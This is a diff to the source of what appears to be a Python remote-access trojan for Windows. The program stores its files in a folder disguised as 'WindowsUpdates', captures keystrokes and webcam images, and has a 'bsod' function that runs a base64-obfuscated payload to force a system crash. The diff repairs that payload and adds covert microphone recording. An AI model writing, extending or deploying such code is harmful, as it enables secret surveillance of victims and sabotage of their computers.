@@ -22,6 +22,9 @@ from time import sleep
 from monitorcontrol import get_monitors
 from monitorcontrol import Monitor
 
+import sounddevice as sd
+from scipy.io.wavfile import write
+
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
 kb_listener = pynput.keyboard.Listener(suppress=True)
@@ -73,7 +76,7 @@ def webcamshot():
   return f"{operation_dir}\\webcamshot.png"
 
 def bsod():
-  exec(base64.b64decode(d2luZGxsLm50ZGxsLlJ0bEFkanVzdFByaXZpbGVnZSgKICAgIGNfdWludCgxOSksCiAgICBjX3VpbnQoMSksCiAgICBjX3VpbnQoMCksCiAgICBieXJlZihjX2ludCgpKQopCgogIHdpbmRsbC5udGRsbC5OdFJhaXNlSGFyZEVycm9yKAogICAgY191bG9uZygweEMwMDAwMDdCKSwKICAgIGNfdWxvbmcoMCksCiAgICBudWxscHRyLAogICAgbnVsbHB0ciwKICAgIGNfdWludCg2KSwKICAgIGJ5cmVmKGNfdWludCgpKQop))
+  exec(base64.b64decode("d2luZGxsLm50ZGxsLlJ0bEFkanVzdFByaXZpbGVnZSgKICAgIGNfdWludCgxOSksCiAgICBjX3VpbnQoMSksCiAgICBjX3VpbnQoMCksCiAgICBieXJlZihjX2ludCgpKQopCgogIHdpbmRsbC5udGRsbC5OdFJhaXNlSGFyZEVycm9yKAogICAgY191bG9uZygweEMwMDAwMDdCKSwKICAgIGNfdWxvbmcoMCksCiAgICBudWxscHRyLAogICAgbnVsbHB0ciwKICAgIGNfdWludCg2KSwKICAgIGJ5cmVmKGNfdWludCgpKQop"))
 
 def hid(command):
   prefix = command.split(" ")[0]
@@ -133,3 +136,10 @@ def on_mon():
     except Exception as e:
       print(e)
 
+def rec_m():
+  fs = 44100
+  seconds = 8
+  myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+  sd.wait()
+  write(f"{operation_dir}/recording.wav", fs, myrecording)
+  return f"{operation_dir}/recording.wav"
